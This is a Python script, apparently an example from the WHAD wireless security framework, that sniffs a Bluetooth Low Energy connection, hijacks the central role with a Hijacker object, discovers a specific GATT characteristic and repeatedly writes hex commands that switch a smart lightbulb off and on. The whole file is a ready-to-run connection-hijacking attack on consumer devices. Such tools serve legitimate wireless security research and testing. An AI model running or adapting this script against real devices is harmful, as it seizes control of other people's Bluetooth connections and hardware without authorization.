from whad.ble import Sniffer, Hijacker, Central, Peripheral
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from time import time,sleep
from whad.ble.profile import UUID
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Read_Response
import sys
from whad.cli.ui import info, success, error

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        try:
            # Create the device
            dev = WhadDevice.create(interface)

            # Wait for a new connection
            sniffer = Sniffer(dev)
            connection = sniffer.wait_new_connection()


            # A new connection has been sniffed and we are synchronized
            info("Press enter to hijack.")
            input()

            # Start the hijacking attack on both master & slave
            hijacker = Hijacker(dev, connection)
            attack_success = hijacker.hijack(master=True, slave=False)
            # if attack is successful, get Central connectors
            if attack_success:
                success("Master successfully hijacked !")
                central = hijacker.central

                if central is not None:
                    # Perform a discovery operation
                    periph = central.peripheral()

                    periph.discover()

                    c = periph.get_characteristic(
                        UUID("a8b3fff0-4834-4051-89d0-3de95cddd318"),
                        UUID("a8b3fff1-4834-4051-89d0-3de95cddd318")
                    )
                    while True:
                        print("Press enter to turn off the lightbulb.")
                        input()
                        c.write(bytes.fromhex("5510000d0a"))
                        print("Press enter to turn on the lightbulb.")
                        input()
                        c.write(bytes.fromhex("5510010d0a"))

            else:
                error("Attack failed, exiting...")
                dev.close()

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
